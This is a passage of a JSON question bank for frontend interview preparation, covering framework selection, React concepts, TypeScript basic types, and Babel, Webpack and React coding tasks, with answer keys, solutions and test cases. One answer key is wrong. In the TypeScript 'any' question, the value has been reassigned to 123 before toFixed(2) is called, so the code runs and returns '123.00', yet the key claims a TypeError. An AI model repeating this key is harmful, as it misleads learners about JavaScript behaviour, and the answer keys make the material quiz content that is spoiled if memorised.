structured nature will help others get up to speed with guidance.\n\n**Counter-arguments (and why they might be less suitable here):**\n\n*   **React**: Offers high flexibility, but this freedom can lead to inconsistencies in larger teams without strong architectural guidelines. While a robust ecosystem exists, choosing and integrating third-party libraries for every concern can be a project in itself.\n*   **Vue**: Excellent for gradual adoption and smaller projects due to its gentle learning curve. While it scales well, its 'progressive' nature means that for a large enterprise app from scratch, a more opinionated framework like Angular might provide better consistency and out-of-the-box features required for large-scale development.\n\nUltimately, Angular's strengths in enterprise-grade consistency, structured scalability, and corporate backing align well with the stated project requirements, despite its learning curve.",
          "options": [],
          "analysisPoints": [
            "Justifies framework choice based on project requirements and team's skills.",
            "Demonstrates deep understanding of framework characteristics (full framework, opinionated, TypeScript, scalability, corporate support).",
            "Provides clear reasoning for choosing one framework over others.",
            "Acknowledges trade-offs (e.g., learning curve) and addresses them."
          ],
          "keyConcepts": [
            "Framework Selection",
            "Enterprise Applications",
            "Consistency",
            "Scalability",
            "Maintainability",
            "React",
            "Angular",
            "Vue"
          ],
          "evaluationCriteria": [
            "Ability to analyze a scenario and make a reasoned decision.",
            "Comprehensive understanding of framework pros and cons.",
            "Application of theoretical knowledge to practical scenarios.",
            "Logical and well-structured argument."
          ],
          "example": null,
          "tags": [
            "Architecture",
            "Framework Selection",
            "Enterprise",
            "Strategy"
          ],
          "prerequisites": [
            "frontend_frameworks_overview",
            "software_architecture"
          ],
          "complexity": 9,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        },
        {
          "id": "question_framework_comparison_6",
          "topic": "Mobile Development with Frameworks",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following frameworks/libraries is most commonly associated with building *native* mobile applications using JavaScript, directly from its core ecosystem?",
          "answer": "React Native",
          "options": [
            "Ionic",
            "NativeScript",
            "React Native",
            "Vue Native"
          ],
          "analysisPoints": [
            "Tests specific knowledge of mobile development solutions.",
            "Distinguishes between native, hybrid, and solutions from different ecosystems.",
            "Focuses on direct ecosystem association."
          ],
          "keyConcepts": [
            "Mobile Development",
            "React Native",
            "NativeScript",
            "Ionic",
            "Vue Native"
          ],
          "evaluationCriteria": [
            "Correctly identifies React Native's primary role.",
            "Differentiates between native and hybrid approaches."
          ],
          "example": null,
          "tags": [
            "Mobile Development",
            "React Native",
            "Native Apps"
          ],
          "prerequisites": [
            "mobile_development_overview"
          ],
          "complexity": 4,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_why_react_1",
          "topic": "Why Choose React - Virtual DOM",
          "level": "medium",
          "type": "mcq",
          "question": "Which statement best describes the primary benefit of React's Virtual DOM?",
          "answer": "It minimizes direct manipulation of the actual DOM by calculating the most efficient updates.",
          "options": [
            "It provides a faster way to write HTML-like syntax directly in JavaScript.",
            "It minimizes direct manipulation of the actual DOM by calculating the most efficient updates.",
            "It automatically handles two-way data binding for form inputs.",
            "It allows React components to be rendered on the server-side for SEO benefits."
          ],
          "analysisPoints": [
            "Accurately defines the core advantage of Virtual DOM (performance optimization through diffing).",
            "Distinguishes Virtual DOM's role from JSX, data binding, or SSR."
          ],
          "keyConcepts": [
            "Virtual DOM",
            "Performance",
            "DOM Manipulation",
            "React"
          ],
          "evaluationCriteria": [
            "Correctly identifies the main benefit of Virtual DOM.",
            "Avoids confusion with other React features.",
            "Understanding of performance implications."
          ],
          "example": null,
          "tags": [
            "React",
            "Virtual DOM",
            "Performance"
          ],
          "prerequisites": [
            "dom_manipulation",
            "javascript_performance"
          ],
          "complexity": 5,
          "interviewFrequency": 10,
          "learningPath": "intermediate"
        },
        {
          "id": "question_why_react_2",
          "topic": "Why Choose React - Data Flow & Components",
          "level": "medium",
          "type": "open",
          "question": "Explain the concepts of 'one-way data flow' and 'reusable components' in React. How do these concepts contribute to writing maintainable and scalable applications?",
          "answer": "**One-way Data Flow (Unidirectional):**\nIn React, data primarily flows in one direction: from parent components down to child components via `props`. When a child needs to communicate back to its parent, it does so by calling a function (callback) passed down as a prop by the parent. This unidirectional flow makes the application's state changes predictable, easier to trace, and significantly simplifies debugging because you always know where data originates and how it propagates through the component tree. This predictability is crucial for maintaining large and complex applications.\n\n**Reusable Components:**\nReact encourages breaking down the UI into small, isolated, and self-contained units called components. Each component is responsible for rendering a specific part of the UI and managing its own state. The 'reusable' aspect means that once a component is built (e.g., a `Button`, `Modal`, or `UserProfileCard`), it can be used multiple times throughout the application or even in different projects with different data, without needing to rewrite the code. This promotes modularity, reduces code duplication, accelerates development, and ensures consistency in the UI, all of which are vital for scalable and maintainable applications.",
          "options": [],
          "analysisPoints": [
            "Clearly defines one-way data flow and its benefits (predictability, debugging).",
            "Clearly defines reusable components and their benefits (modularity, consistency, speed).",
            "Connects both concepts to maintainability and scalability."
          ],
          "keyConcepts": [
            "One-way Data Flow",
            "Reusable Components",
            "Props",
            "State",
            "Maintainability",
            "Scalability",
            "React"
          ],
          "evaluationCriteria": [
            "Accurate definition of both concepts.",
            "Comprehensive explanation of their advantages.",
            "Ability to link theoretical concepts to practical benefits in development."
          ],
          "example": null,
          "tags": [
            "React",
            "Architecture",
            "Data Flow",
            "Components",
            "Best Practices"
          ],
          "prerequisites": [
            "react_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 10,
          "learningPath": "intermediate"
        },
        {
          "id": "question_why_react_3",
          "topic": "Why Choose React - JSX",
          "level": "easy",
          "type": "flashcard",
          "question": "What is JSX in React and why is it beneficial?",
          "answer": "JSX (JavaScript XML) is a syntax extension for JavaScript that allows you to write HTML-like markup directly within your JavaScript code. It's beneficial because it combines markup and logic in the same file, making components self-contained, highly readable, and easier to understand.",
          "options": [],
          "analysisPoints": [
            "Defines JSX as HTML-like syntax in JS.",
            "Highlights benefits like readability and self-contained components."
          ],
          "keyConcepts": [
            "JSX",
            "React",
            "Syntax Extension"
          ],
          "evaluationCriteria": [
            "Correct definition of JSX.",
            "Understanding of its advantages for component development."
          ],
          "example": null,
          "tags": [
            "React",
            "JSX",
            "Syntax"
          ],
          "prerequisites": [
            "react_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_why_react_4",
          "topic": "Why Choose React - SEO",
          "level": "medium",
          "type": "mcq",
          "question": "How does React address the challenges of Search Engine Optimization (SEO) commonly faced by traditional Single Page Applications (SPAs)?",
          "answer": "React supports Server-Side Rendering (SSR), which pre-renders the initial HTML on the server before sending it to the browser.",
          "options": [
            "React uses a highly optimized Virtual DOM that is directly indexable by search engines.",
            "React automatically generates sitemap files that are submitted to search engines.",
            "React supports Server-Side Rendering (SSR), which pre-renders the initial HTML on the server before sending it to the browser.",
            "React requires all application data to be fetched synchronously, making it easier for crawlers."
          ],
          "analysisPoints": [
            "Identifies SSR as the primary solution for React SEO.",
            "Correctly explains how SSR works for SEO.",
            "Dismisses incorrect or unrelated options."
          ],
          "keyConcepts": [
            "React",
            "SEO",
            "SPA",
            "Server-Side Rendering (SSR)",
            "Crawlers"
          ],
          "evaluationCriteria": [
            "Correctly identifies SSR as the solution.",
            "Understands the mechanism of SSR for SEO.",
            "Distinguishes from misconceptions about Virtual DOM or synchronous data."
          ],
          "example": null,
          "tags": [
            "React",
            "SEO",
            "SSR",
            "Performance"
          ],
          "prerequisites": [
            "react_basics",
            "spa_architecture"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_why_react_5",
          "topic": "Why Choose React - Ecosystem & Cohesion",
          "level": "medium",
          "type": "open",
          "question": "Discuss the 'rich tool ecosystem' and 'high cohesion, loose coupling' principles as they apply to React development. How do these aspects benefit large-scale projects?",
          "answer": "**Rich Tool Ecosystem:**\nReact's popularity has fostered a vast and vibrant ecosystem of official and third-party tools, libraries, and extensions. This includes state management solutions (Redux, Zustand), routing libraries (React Router), UI component libraries (Material-UI, Ant Design), testing utilities (React Testing Library), and build tools (Create React App, Next.js). For large-scale projects, this means:\n*   **Accelerated Development**: Ready-made solutions reduce the need to build everything from scratch.\n*   **Problem Solving**: Solutions exist for almost any common challenge.\n*   **Community Support**: Large community provides ample documentation, tutorials, and help.\n\n**High Cohesion, Loose Coupling:**\n*   **High Cohesion**: A React component is typically designed to encapsulate all related logic, markup, and (often) styling for a specific UI piece. This means everything a component needs to function is contained within it, making it self-sufficient and easier to understand and manage in isolation.\n*   **Loose Coupling**: Components interact with each other primarily through props (data down) and callbacks (events up), minimizing direct dependencies between them. This means changing one component is less likely to break another. \n\nFor large-scale projects, these principles lead to:\n*   **Easier Maintenance**: Changes are localized, reducing the risk of unintended side effects.\n*   **Improved Testability**: Isolated components are easier to unit test.\n*   **Enhanced Collaboration**: Multiple teams/developers can work on different components concurrently with minimal conflicts.\n*   **Greater Scalability**: The application can grow by adding or modifying components independently, without impacting the entire system.",
          "options": [],
          "analysisPoints": [
            "Defines 'rich tool ecosystem' and lists examples.",
            "Explains 'high cohesion' (internal self-sufficiency).",
            "Explains 'loose coupling' (minimal dependencies, clear interfaces).",
            "Connects these concepts to benefits in large-scale project development (speed, maintainability, collaboration, scalability)."
          ],
          "keyConcepts": [
            "React Ecosystem",
            "Cohesion",
            "Coupling",
            "Scalability",
            "Maintainability",
            "Modularity"
          ],
          "evaluationCriteria": [
            "Accurate definitions of technical terms.",
            "Comprehensive explanation of their advantages for large projects.",
            "Demonstrates understanding of software design principles."
          ],
          "example": null,
          "tags": [
            "React",
            "Architecture",
            "Ecosystem",
            "Design Principles",
            "Scalability"
          ],
          "prerequisites": [
            "react_basics",
            "software_design"
          ],
          "complexity": 8,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_typescript_basics_1",
          "topic": "TypeScript Basic Types",
          "level": "easy",
          "type": "flashcard",
          "question": "In TypeScript, what is the difference between `number[]` and `Array<number>` when declaring an array type?",
          "answer": "There is no functional difference; both `number[]` (shorthand syntax) and `Array<number>` (generic array type) are valid ways to declare an array whose elements are all numbers.",
          "options": [],
          "analysisPoints": [
            "Identifies that both notations are equivalent.",
            "Confirms understanding of array type declaration."
          ],
          "keyConcepts": [
            "TypeScript Arrays",
            "Type Syntax",
            "Generics"
          ],
          "evaluationCriteria": [
            "Correctly states their equivalence.",
            "Demonstrates familiarity with TypeScript array syntax."
          ],
          "example": null,
          "tags": [
            "TypeScript",
            "Arrays",
            "Types"
          ],
          "prerequisites": [
            "typescript_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_typescript_basics_2",
          "topic": "TypeScript Basic Types - `any`",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following TypeScript code:\n\n```typescript\nlet data: any = \"hello\";\ndata = 123;\nlet result = data.toFixed(2);\n```\n\nWhat is the expected behavior when this code is compiled and then run?",
          "answer": "It will compile successfully, but throw a runtime error `TypeError: data.toFixed is not a function` when `data.toFixed(2)` is executed.",
          "options": [
            "It will result in a compile-time error because `toFixed` is not a method on a string.",
            "It will compile successfully and `result` will be `\"123.00\"`.",
            "It will compile successfully, but throw a runtime error `TypeError: data.toFixed is not a function` when `data.toFixed(2)` is executed.",
            "It will compile successfully, and `result` will be `undefined`."
          ],
          "analysisPoints": [
            "Tests understanding of `any` type's behavior (bypassing compile-time checks).",
            "Recognizes that runtime type errors can still occur with `any`.",
            "Identifies the correct method (`toFixed`) is for numbers, not strings."
          ],
          "keyConcepts": [
            "TypeScript `any` type",
            "Type Safety",
            "Runtime Errors",
            "Compile-time Errors"
          ],
          "evaluationCriteria": [
            "Correctly predicts compile-time behavior with `any`.",
            "Accurately identifies the runtime error and its cause.",
            "Understanding of the trade-offs of using `any`."
          ],
          "example": null,
          "tags": [
            "TypeScript",
            "Any Type",
            "Error Handling",
            "Runtime"
          ],
          "prerequisites": [
            "typescript_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_typescript_basics_3",
          "topic": "TypeScript Basic Types - Tuple",
          "level": "medium",
          "type": "code",
          "question": "Define a TypeScript tuple type named `Coordinates` that represents a point in 3D space with x, y, and z coordinates, all of which are numbers. Then, declare a variable `myPoint` of this type and initialize it with values (10, 20, 30). Finally, try to assign a string to the second element of `myPoint` and explain the outcome.",
          "answer": "```typescript\ntype Coordinates = [number, number, number];\n\nlet myPoint: Coordinates = [10, 20, 30];\n\n// Attempt to assign a string to the second element\n// myPoint[1] = \"forty\"; // This line would cause a compile-time error\n\n/*\nOutcome Explanation:\nWhen attempting to assign `\"forty\"` (a string) to `myPoint[1]` (which is defined as a `number` in the `Coordinates` tuple type), TypeScript will throw a compile-time error. The error message would typically be similar to: \n\"Type 'string' is not assignable to type 'number'.\" \nThis demonstrates TypeScript's type safety: tuples enforce fixed types at specific positions, preventing incorrect data assignments during development.\n*/\n```",
          "options": [],
          "analysisPoints": [
            "Correctly defines a tuple type with specific number elements.",
            "Accurately initializes the tuple variable.",
            "Demonstrates understanding of tuple's fixed type constraint by identifying the compile-time error.",
            "Clearly explains the reason for the error."
          ],
          "keyConcepts": [
            "TypeScript Tuple",
            "Type Definition",
            "Type Safety",
            "Compile-time Error"
          ],
          "evaluationCriteria": [
            "Correct tuple type declaration.",
            "Accurate initialization.",
            "Proper identification and explanation of the type error.",
            "Demonstrates grasp of tuple immutability regarding types."
          ],
          "example": null,
          "tags": [
            "TypeScript",
            "Tuple",
            "Type Safety"
          ],
          "prerequisites": [
            "typescript_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_typescript_basics_4",
          "topic": "TypeScript Basic Types - Enum",
          "level": "medium",
          "type": "open",
          "question": "When would you prefer using a TypeScript `enum` over a simple string literal union type (e.g., `type Status = 'active' | 'inactive';`) for defining a set of named constants? Provide a scenario.",
          "answer": "You might prefer using a TypeScript `enum` when:\n\n1.  **You need integer-backed constants (Numeric Enums):** If the constants need to have numerical values that might correspond to backend codes, database values, or bit flags, numeric enums are a natural fit. String literal unions are purely for string values.\n2.  **You want reverse mappings:** Numeric enums generate reverse mappings, allowing you to get the string name from the numeric value (`Color[0]` yields `'Red'`). String enums do not have this property by default, but you get type-safety.\n3.  **You prefer a more distinct 'constant' type:** Enums create a distinct type that is not just a union of literal types. This can sometimes lead to clearer intent and more explicit type checks.\n4.  **You are migrating from other languages with Enum concepts:** Developers coming from C#, Java, etc., might find enums more familiar.\n\n**Scenario:**\nConsider an application that interacts with a backend API where HTTP status codes are used extensively, and you want to refer to them by meaningful names within the frontend. Using a numeric enum for `HttpStatus` allows you to define these constants with their actual numerical values, making the code readable while directly mapping to the API's expectations:\n\n```typescript\nenum HttpStatus {\n  OK = 200,\n  CREATED = 201,\n  BAD_REQUEST = 400,\n  UNAUTHORIZED = 401,\n  NOT_FOUND = 404,\n  INTERNAL_SERVER_ERROR = 500,\n}\n\nfunction handleResponse(statusCode: HttpStatus, data: any) {\n  if (statusCode === HttpStatus.OK) {\n    console.log(\"Request successful:\", data);\n  } else if (statusCode === HttpStatus.NOT_FOUND) {\n    console.warn(\"Resource not found.\");\n  } else {\n    console.error(\"An error occurred with status:\", statusCode);\n  }\n}\n\nhandleResponse(HttpStatus.OK, { message: \"Data fetched\" });\nhandleResponse(HttpStatus.NOT_FOUND, null);\n// handleResponse(200, { message: \"Legacy\" }); // Still works due to enum's numeric nature\n```\n\nIn contrast, a string literal union like `type Status = 'OK' | 'NOT_FOUND'` would force you to use strings (`'OK'`) and might not directly map to the numeric values expected by external systems without manual conversion.",
          "options": [],
          "analysisPoints": [
            "Compares enums to string literal unions based on use cases (numeric values, reverse mapping, distinct type).",
            "Provides a clear, relevant scenario where enum is advantageous (HTTP status codes, API integration).",
            "Demonstrates code example supporting the explanation."
          ],
          "keyConcepts": [
            "TypeScript Enum",
            "String Literal Union",
            "Named Constants",
            "Type Safety",
            "Numeric Enums"
          ],
          "evaluationCriteria": [
            "Understanding of the differences and trade-offs.",
            "Ability to articulate specific advantages of enums.",
            "Provision of a practical and relevant use case with code.",
            "Clear explanation of why one is preferred in the scenario."
          ],
          "example": null,
          "tags": [
            "TypeScript",
            "Enums",
            "Types",
            "Best Practices"
          ],
          "prerequisites": [
            "typescript_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 6,
          "learningPath": "advanced"
        },
        {
          "id": "question_typescript_basics_5",
          "topic": "TypeScript Basic Types - Primitives",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following TypeScript declarations will **not** result in a compile-time error?",
          "answer": "```typescript\nlet city: string = \"New York\";\ncity = 'London';\n```",
          "options": [
            "```typescript\nlet count: number = 5;\ncount = \"ten\";\n```",
            "```typescript\nlet isActive: boolean = true;\nisActive = 0;\n```",
            "```typescript\nlet data: [string, number] = [\"item\", 50];\ndata[0] = 100;\n```",
            "```typescript\nlet city: string = \"New York\";\ncity = 'London';\n```"
          ],
          "analysisPoints": [
            "Tests understanding of primitive type assignments (string, number, boolean).",
            "Tests understanding of tuple type immutability at specific positions.",
            "Identifies correct type re-assignment for a string variable."
          ],
          "keyConcepts": [
            "TypeScript Primitives",
            "Type Assignment",
            "Type Safety",
            "Tuple Types"
          ],
          "evaluationCriteria": [
            "Accurate identification of correct type usage.",
            "Recognition of type errors in incorrect options.",
            "Understanding of strict type checking."
          ],
          "example": "The correct option demonstrates valid re-assignment of a string literal to a variable declared as `string`. All other options involve assigning a value of an incompatible type (e.g., `string` to `number`, `number` to `boolean`, `number` to `string` within a tuple), which TypeScript's static type checker correctly flags as errors at compile time.",
          "tags": [
            "TypeScript",
            "Primitives",
            "Type Safety",
            "Errors"
          ],
          "prerequisites": [
            "typescript_basics"
          ],
          "complexity": 4,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_typescript_basics_6",
          "topic": "TypeScript Basic Types - Void and Never",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the primary difference in meaning between a function returning `void` and a function returning `never` in TypeScript?",
          "answer": "A function returning `void` means it does not return any value, or its return value is ignored (e.g., `console.log()`). A function returning `never` means it will never return, typically because it throws an error or enters an infinite loop, indicating an unreachable end point.",
          "options": [],
          "analysisPoints": [
            "Defines `void` as absence of return value.",
            "Defines `never` as function that never completes execution.",
            "Provides clear distinction and examples implied by context."
          ],
          "keyConcepts": [
            "TypeScript Void",
            "TypeScript Never",
            "Return Types",
            "Type System"
          ],
          "evaluationCriteria": [
            "Accurate definition of both `void` and `never`.",
            "Clear differentiation of their practical implications.",
            "Understanding of their use cases."
          ],
          "example": null,
          "tags": [
            "TypeScript",
            "Types",
            "Void",
            "Never"
          ],
          "prerequisites": [
            "typescript_basics"
          ],
          "complexity": 5,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        }
      ],
      "tasks": [
        {
          "id": "task_babel_config",
          "title": "Configure Babel for ES6+ Transpilation and Class Properties",
          "description": "\nYour task is to set up a minimal Babel configuration (`babel.config.js`) for a new JavaScript project. The requirements are:\n\n1.  **Transpile modern JavaScript (ES6+ features)** to be compatible with a target environment that includes `last 2 major versions` of browsers and `not dead` browsers.\n2.  Enable support for **Class Properties** syntax (e.g., `class MyClass { myProperty = 'value'; }`).\n3.  Ensure that **polyfills for used features** are automatically included efficiently (using `core-js` v3).\n\nCreate the `babel.config.js` file with the necessary `presets` and `plugins` to meet these requirements. Assume `core-js` is installed.\n",
          "difficulty": "medium",
          "startingCode": "// babel.config.js\nmodule.exports = {\n  // Your configuration goes here\n};\n\n// Example ES6+ code you'd want to transpile:\n// class MyComponent {\n//   static defaultProps = { greeting: 'Hello' };\n//   message = 'World';\n//   constructor(name) {\n//     this.name = name;\n//   }\n//   greet = () => {\n//     return `${MyComponent.defaultProps.greeting}, ${this.message}, ${this.name}!`\n//   }\n// }\n// const comp = new MyComponent('Developer');\n// console.log(comp.greet());\n",
          "solutionCode": "module.exports = {\n  presets: [\n    ['@babel/preset-env', {\n      targets: {\n        browsers: ['last 2 major versions', 'not dead']\n      },\n      useBuiltIns: 'usage',\n      corejs: 3\n    }]\n  ],\n  plugins: [\n    '@babel/plugin-proposal-class-properties'\n  ]\n};",
          "testCases": [
            "The `presets` array should contain `@babel/preset-env`.",
            "The `targets` option within `@babel/preset-env` should include `['last 2 major versions', 'not dead']`.",
            "The `useBuiltIns` option should be set to `'usage'`.",
            "The `corejs` option should be set to `3`.",
            "The `plugins` array should contain `@babel/plugin-proposal-class-properties`.",
            "The configuration should be a valid JavaScript module export."
          ],
          "hints": [
            "Remember that `preset-env` handles general modern JavaScript features based on your target environments.",
            "For specific, often experimental, language features like class properties, you usually need a dedicated plugin.",
            "`useBuiltIns` and `corejs` are crucial for intelligent polyfilling to avoid including unnecessary polyfills."
          ],
          "tags": [
            "Babel",
            "Configuration",
            "Transpilation",
            "ES6+",
            "Plugins",
            "Presets"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "javascript_basics",
            "npm_yarn_basics"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_transpilers_babel",
            "question_transpilers_babel_3"
          ]
        },
        {
          "id": "task_setup_dev_workflow",
          "title": "Setup a Basic Frontend Project with Webpack and Dev Server",
          "description": "\nYour task is to set up a bare-bones frontend project that demonstrates key steps of a modern development workflow. Specifically, you need to:\n\n1.  **Initialize a new Node.js project** using npm.\n2.  **Install Webpack 5** and its CLI as development dependencies.\n3.  **Install Webpack Dev Server** as a development dependency.\n4.  Create a minimal `src/index.js` file with a simple `console.log` statement.\n5.  Create a `webpack.config.js` file that:\n    *   Sets the `mode` to 'development'.\n    *   Defines `src/index.js` as the entry point.\n    *   Configures the output bundle to be `bundle.js` in a `dist` directory.\n    *   Configures a `devServer` to serve files from `dist` and enable hot reloading.\n6.  Add `start` and `build` scripts to `package.json` to run the dev server and build the project respectively.\n\nDemonstrate the setup by providing the `package.json` and `webpack.config.js` files, and explain the commands to run.\n",
          "difficulty": "medium",
          "startingCode": "/* No starting code needed for files, just project structure. */\n\n// 1. Initialize project: `npm init -y`\n// 2. Install dependencies: `npm install --save-dev webpack webpack-cli webpack-dev-server`\n\n// src/index.js (Create this file):\n// console.log('Hello from Webpack!');\n\n// package.json (Update the scripts section):\n// Your scripts here\n\n// webpack.config.js (Create this file):\n// Your Webpack configuration here\n",
          "solutionCode": "/* package.json */\n{\n  \"name\": \"my-webpack-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"start\": \"webpack serve --open\",\n    \"build\": \"webpack --mode production\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"devDependencies\": {\n    \"webpack\": \"^5.0.0\",\n    \"webpack-cli\": \"^4.0.0\",\n    \"webpack-dev-server\": \"^4.0.0\"\n  }\n}\n\n/* webpack.config.js */\nconst path = require('path');\n\nmodule.exports = {\n  mode: 'development',\n  entry: './src/index.js',\n  output: {\n    filename: 'bundle.js',\n    path: path.resolve(__dirname, 'dist'),\n  },\n  devServer: {\n    static: path.join(__dirname, 'dist'),\n    compress: true,\n    port: 8080,\n    hot: true, // Enable Hot Module Replacement\n  },\n};\n\n/* src/index.js */\nconsole.log('Hello from Webpack!');\n\n/* Commands to run: */\n// To start development server: `npm start`\n// To build for production: `npm run build`\n",
          "testCases": [
            "The `package.json` file should contain `webpack`, `webpack-cli`, and `webpack-dev-server` as `devDependencies`.",
            "The `package.json` should have a `start` script using `webpack serve` and a `build` script using `webpack --mode production`.",
            "The `webpack.config.js` should specify `mode: 'development'`.",
            "The `entry` in `webpack.config.js` should point to `./src/index.js`.",
            "The `output` in `webpack.config.js` should define `filename: 'bundle.js'` and a `path` resolving to `dist`.",
            "The `devServer` configuration should be present, serving static files from `dist` and having `hot: true`.",
            "A `src/index.js` file with content should exist."
          ],
          "hints": [
            "Remember to `require('path')` for resolving file paths correctly in Node.js.",
            "The `static` property in `devServer` tells it where to serve content from.",
            "The `--open` flag for `webpack serve` is optional but convenient for automatically opening the browser."
          ],
          "tags": [
            "Webpack",
            "Build Tools",
            "Development Workflow",
            "npm",
            "Hot Reloading"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "npm_yarn_basics",
            "javascript_modules"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_modern_dev_workflow",
            "example_webpack_config"
          ]
        },
        {
          "id": "task_react_component_hierarchy",
          "title": "Build a Hierarchical Counter Component in React",
          "description": "\nImplement a simple React application that demonstrates a hierarchical component structure, one-way data flow, and state management. You need to create:\n\n1.  A `CounterDisplay` component that receives a `count` prop and displays it.\n2.  A `CounterButton` component that receives an `onClick` prop and a `label` prop. When clicked, it should call the `onClick` function.\n3.  A `ParentCounter` component that:\n    *   Manages its own `count` state (initialized to 0).\n    *   Renders a `CounterDisplay` component, passing its `count` state as a prop.\n    *   Renders two `CounterButton` components: one for 'Increment' and one for 'Decrement'.\n    *   Implements `increment` and `decrement` functions that update the `count` state. These functions should be passed down to the `CounterButton` components via their `onClick` prop.\n\nThis task highlights reusable components, one-way data flow from parent to child, and how children communicate back to parents via callbacks.\n",
          "difficulty": "medium",
          "startingCode": "import React, { useState } from 'react';\n\n// 1. Create CounterDisplay component here\n\n// 2. Create CounterButton component here\n\n// 3. Create ParentCounter component here\n\n// Export ParentCounter as default\nexport default ParentCounter;",
          "solutionCode": "import React, { useState } from 'react';\n\n// 1. CounterDisplay Component\nfunction CounterDisplay({ count }) {\n  return (\n    <p style={{ fontSize: '2em', fontWeight: 'bold' }}>Current Count: {count}</p>\n  );\n}\n\n// 2. CounterButton Component\nfunction CounterButton({ onClick, label }) {\n  return (\n    <button \n      onClick={onClick} \n      style={{\n        margin: '5px',\n        padding: '10px 20px',\n        fontSize: '1em',\n        cursor: 'pointer'\n      }}\n    >\n      {label}\n    </button>\n  );\n}\n\n// 3. ParentCounter Component\nfunction ParentCounter() {\n  const [count, setCount] = useState(0);\n\n  const increment = () => {\n    setCount(prevCount => prevCount + 1);\n  };\n\n  const decrement = () => {\n    setCount(prevCount => prevCount - 1);\n  };\n\n  return (\n    <div style={{ textAlign: 'center', fontFamily: 'Arial, sans-serif' }}>\n      <h2>React Counter App</h2>\n      <CounterDisplay count={count} />\n      <div>\n        <CounterButton onClick={increment} label=\"Increment\" />\n        <CounterButton onClick={decrement} label=\"Decrement\" />\n      </div>\n    </div>\n  );\n}\n\nexport default ParentCounter;",
          "testCases": [
            "The `ParentCounter` component should manage a `count` state initialized to `0`.",
            "Clicking 'Increment' button should increase the displayed count by 1.",
            "Clicking 'Decrement' button should decrease the displayed count by 1.",
            "The `CounterDisplay` component should correctly receive and show the `count` prop.",
            "The `CounterButton` components should correctly receive `onClick` and `label` props and trigger the parent's function when clicked.",
            "The application should render without console errors or warnings."
          ],
          "hints": [
            "Use the `useState` hook in the `ParentCounter` component to manage the `count`.",
            "Remember to pass functions as props to child components for callbacks.",
            "Children components should not directly modify parent state; they should call functions passed from the parent."
          ],
          "tags": [
            "React",
            "Components",
            "State Management",
            "Props",
            "One-way Data Flow",
            "Hooks"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "react_basics",
            "javascript_es6"
          ],
          "complexity": 7,
          "interviewRelevance": 10,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_why_choose_react",
            "example_react_component"
          ]
        },
        {
          "id": "task_typescript_basic_types",
          "title": "Type-Safe User Profile Function with Enums and Tuples",
          "description": "\nCreate a TypeScript function that processes user profile data, ensuring type safety using various basic TypeScript types.\n\n1.  Define a string `enum` called `UserStatus` with values: `ACTIVE`, `INACTIVE`, `PENDING`.\n2.  Define a `type alias` called `UserProfile` that is a tuple with the following structure and types:\n    *   Element 1: `number` (User ID)\n    *   Element 2: `string` (User Name)\n    *   Element 3: `UserStatus` (User Status from the enum)\n    *   Element 4: `boolean` (Is Admin)\n3.  Implement a function `displayUserProfile(profile: UserProfile): string` that:\n    *   Takes a `UserProfile` tuple as input.\n    *   Deconstructs the tuple to access its elements.\n    *   Returns a formatted string describing the user's profile, including their ID, name, status, and whether they are an admin. For example: \"User ID: 1, Name: Alice (ACTIVE), Admin: Yes\".\n4.  Demonstrate the function with at least two example `UserProfile` tuples.\n5.  Add a line of code that would cause a compile-time error if type safety were violated (e.g., trying to assign an invalid status or wrong type to a tuple element), and comment on why it fails.\n",
          "difficulty": "medium",
          "startingCode": "enum UserStatus { /* ... */ }\n\ntype UserProfile = [/* ... */];\n\nfunction displayUserProfile(profile: UserProfile): string {\n  // Implement function logic here\n}\n\n// Example usage\n// const user1: UserProfile = [/* ... */];\n// console.log(displayUserProfile(user1));\n\n// Example of compile-time error (commented out)\n// let invalidProfile: UserProfile = [/* ... */];\n// invalidProfile[2] = \"INVALID\"; // This should cause an error\n",
